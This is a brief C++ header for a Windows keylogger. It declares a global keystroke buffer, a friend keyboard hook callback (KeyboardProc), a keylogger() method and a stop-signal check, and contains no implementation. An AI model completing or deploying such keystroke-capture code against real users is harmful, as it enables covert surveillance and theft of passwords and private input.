#pragma once

#include "DataObj/KLG_Obj.h"
#include <memory>
#include <conio.h>
#include <windows.h>
#include <vector>

std::vector<int> keylog;

class KLG_Func
{
public:
	friend LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);

	DataObj* keylogger();

	bool checkStopSignal();

};
